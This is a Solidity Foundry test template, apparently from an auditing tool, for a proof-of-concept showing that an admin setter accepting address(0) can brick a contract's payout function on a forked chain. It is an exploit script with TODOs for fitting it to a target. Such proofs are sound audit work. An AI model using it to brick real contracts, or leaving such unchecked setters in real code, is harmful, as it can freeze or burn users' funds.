// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Zero-address write bricks the contract
/// @notice Detector: zero-address. A privileged setter accepts address(0)
///         for a critical address (fee recipient, treasury, owner,
///         oracle). Once set, every payout / fee / price read that touches
///         the zero address reverts or burns funds -- the contract bricks.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the setter + the dependent
///      function to the target. Pranks the admin: this proves the setter
///      LACKS a zero check (the check is the fix).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the admin who can call the setter (read from owner() or set).
    address public constant ADMIN = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(ADMIN != address(0), "set ADMIN to the account that can call the setter");

        // TODO: adapt to the target's real setter (setFeeRecipient /
        // setTreasury / setOwner / setOracle / setRouter).
        vm.prank(ADMIN);
        (bool setOk,) = target.call(
            abi.encodeWithSignature("setFeeRecipient(address)", address(0))
        );
        require(setOk, "setter rejected address(0) -- zero check present (not vulnerable)");

        // The dependent function must now fail (or burn funds).
        // TODO: adapt to the real dependent function (distribute / payout
        // / claim / collectFees).
        (bool ok,) = target.call(abi.encodeWithSignature("distribute()"));
        console.log("dependent function ok after zero-address write:", ok);
        assertTrue(!ok, "exploit did not reproduce: contract still works with zero address set");

    }
}
